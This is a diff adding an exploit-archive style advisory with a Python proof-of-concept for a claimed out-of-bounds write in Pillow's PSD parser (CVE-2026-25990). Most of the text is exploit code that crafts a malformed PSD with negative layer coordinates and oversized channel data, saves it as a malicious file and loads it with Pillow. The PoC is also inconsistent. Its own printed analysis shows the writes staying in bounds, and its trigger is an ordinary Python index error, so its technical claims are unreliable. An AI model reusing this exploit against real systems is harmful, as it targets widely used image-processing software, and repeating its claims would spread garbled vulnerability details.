@@ -1,0 +1,198 @@
+=============================================================================================================================================
+| # Title     : Pillow PSD Parser Potential Out-of-Bounds Write                                                                             |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.3 (64 bits)                                                            |
+| # Vendor    : https://pypi.org/project/pillow/                                                                                            |
+=============================================================================================================================================
+
+[+] Summary    :  CVE-2026-25990 describes a potential Out-of-Bounds (OOB) Write vulnerability in the PSD parsing logic of Pillow. 
+                  The issue arises from improper validation of layer boundary coordinates (top, left, bottom, right) within crafted Photoshop (PSD) files.
+                  By manipulating signed layer coordinates and creating inconsistencies between declared layer dimensions and actual channel image data sizes, 
+				  an attacker may trigger incorrect memory calculations during buffer allocation or pixel write operations.
+
+
+[+] POC :
+
+#!/usr/bin/env python3
+
+import struct
+import os
+
+class OOBWriteExploit:
+    def __init__(self, output_file="oob_write.psd"):
+        self.output_file = output_file
+        
+    def create_oob_write_psd(self):
+        """
+        Creates a PSD file that triggers an Out-of-Bounds (OOB) Write
+        """
+        psd_data = bytearray()
+        psd_data.extend(b'8BPS')          
+        psd_data.extend(struct.pack('>H', 1))  
+        psd_data.extend(b'\x00' * 6)      
+        psd_data.extend(struct.pack('>H', 4))
+        psd_data.extend(struct.pack('>I', 1000)) 
+        psd_data.extend(struct.pack('>I', 1000)) 
+        psd_data.extend(struct.pack('>H', 8))    
+        psd_data.extend(struct.pack('>H', 3))    
+        psd_data.extend(struct.pack('>I', 0))
+        psd_data.extend(struct.pack('>I', 0))
+        layer_mask_start = len(psd_data)
+        psd_data.extend(struct.pack('>I', 0)) 
+        layer_info_start = len(psd_data)
+        psd_data.extend(struct.pack('>I', 0)) 
+        psd_data.extend(struct.pack('>h', 1)) 
+
+        top = -50     
+        left = -50   
+        bottom = 150   
+        right = 150   
+
+        psd_data.extend(struct.pack('>i', top))
+        psd_data.extend(struct.pack('>i', left))
+        psd_data.extend(struct.pack('>i', bottom))
+        psd_data.extend(struct.pack('>i', right))
+
+        num_channels = 4
+        psd_data.extend(struct.pack('>H', num_channels))
+
+        channel_positions = []
+        for i in range(num_channels):
+            if i < 3:
+                channel_id = i 
+            else:
+                channel_id = -1 
+            
+            psd_data.extend(struct.pack('>h', channel_id))
+            channel_positions.append(len(psd_data))
+            psd_data.extend(struct.pack('>I', 0)) 
+
+        psd_data.extend(b'8BIM')    
+        psd_data.extend(b'norm')     
+        psd_data.extend(b'\xff')      
+        psd_data.extend(b'\x00')      
+        psd_data.extend(b'\x08')      
+        psd_data.extend(b'\x00')     
+        psd_data.extend(struct.pack('>I', 0)) 
+
+        if len(psd_data) % 2:
+            psd_data.extend(b'\x00')
+
+        for i, pos in enumerate(channel_positions):
+            compression = 0  
+            psd_data.extend(struct.pack('>H', compression))
+
+            if i == 2:  
+                channel_data = b'A' * 2000  
+            else:
+                channel_data = b'\x80' * 1000
+
+            channel_full_data = struct.pack('>H', 0) + channel_data
+
+            psd_data[pos:pos+4] = struct.pack('>I', len(channel_full_data))
+
+            psd_data.extend(channel_full_data)
+
+            if len(psd_data) % 2:
+                psd_data.extend(b'\x00')
+
+        psd_data.extend(struct.pack('>I', 0))
+
+        layer_info_length = len(psd_data) - layer_info_start - 4
+        psd_data[layer_info_start:layer_info_start+4] = struct.pack('>I', layer_info_length)
+        layer_mask_length = len(psd_data) - layer_mask_start - 4
+        psd_data[layer_mask_start:layer_mask_start+4] = struct.pack('>I', layer_mask_length)
+        psd_data.extend(struct.pack('>H', 0)) 
+        psd_data.extend(b'\x00' * (1000 * 1000 * 4))
+        
+        return psd_data
+    
+    def analyze_oob_write(self):
+        """
+        Analyzes how the OOB Write occurs
+        """
+        print("\n Analysis of OOB Write Mechanism:")
+        print("=" * 50)
+
+        layer_width = 200
+        layer_height = 200
+        channels = 4
+        print("\n Calculations in Pillow:")
+        print(f"left = -50, top = -50")
+        print(f"right = 150, bottom = 150")
+        print(f"layer_width = right - left = {layer_width}")
+        print(f"layer_height = bottom - top = {layer_height}")
+        buffer_size = layer_width * layer_height * channels
+        print(f"\n Allocated buffer: {buffer_size:,} bytes ({layer_width}x{layer_height}x{channels})")
+        print("\n Writing Process:")
+        print("for y in range(layer_height):")
+        print("    for x in range(layer_width):")
+        print("        dest_pos = (y * layer_width + x) * channels")
+        print("        buffer[dest_pos:dest_pos+channels] = pixel_data")
+        print("\n The Logic:")
+        print("At x = 0, y = 0:")
+        print("  Required pixel is at (-50, -50) in the original image coordinates.")
+        print("  However, in the internal buffer, the position is (0, 0).")
+        print("  Writing will occur correctly at buffer[0].")
+        print("\nAt x = 199, y = 199:")
+        print("  Required pixel is at (149, 149) in original coordinates.")
+        print("  In the internal buffer, the index is (199, 199).")
+        print("  Writing occurs at buffer[199*200 + 199] = buffer[39,799].")
+        print(f"  This is within buffer bounds (max = {buffer_size//channels - 1}) ✓")
+        print("\n **The Real Vulnerability**:")
+        print("An Out-of-Bounds write occurs when:")
+        print("1. There is a mismatch between the allocated buffer size and the actual data.")
+        print("2. Computed coordinates exceed buffer bounds due to integer overflow.")
+        print("3. Channel data provided is larger than the record headers claim.")
+        print("\nExample of OOB Write:")
+        print("buffer[dest_pos] = data_byte")
+        print("If dest_pos > len(buffer) → OOB Write")
+        
+    def save_psd(self):
+        """Saves the malicious file"""
+        malicious_data = self.create_oob_write_psd()
+        
+        with open(self.output_file, 'wb') as f:
+            f.write(malicious_data)
+        
+        print(f"\n[+] Created OOB Write file: {self.output_file}")
+        print(f"[+] File size: {len(malicious_data):,} bytes")
+
+        self.analyze_oob_write()
+
+def test_oob_write(psd_file):
+    """
+    Tests for OOB Write in Pillow
+    """
+    try:
+        from PIL import Image
+        import array
+        
+        print(f"\n Testing Pillow Version: {Image.__version__}")
+
+        img = Image.open(psd_file)
+        print(f"Image Dimensions: {img.size}")
+
+        pixels = img.load()
+
+        try:
+            # Trigger write attempt
+            pixels[1000, 1000] = (255, 0, 0)
+            print("Write successful (OOB might not have triggered)")
+        except Exception as e:
+            print(f"Error during pixel access: {e}")
+            
+    except Exception as e:
+        print(f"Failed to open/load image: {e}")
+
+if __name__ == "__main__":
+    exploit = OOBWriteExploit("oob_write_cve-2026-25990.psd")
+    exploit.save_psd()
+    
+    print("\n[!] To test:")
+    print("python3 -c 'from PIL import Image; Image.open(\"oob_write_cve-2026-25990.psd\").load()'")
+	
+	
+Greetings to :======================================================================
+jericho * Larry W. Cashdollar * r00t * Hussin-X * Malvuln (John Page aka hyp3rlinx)|
+====================================================================================
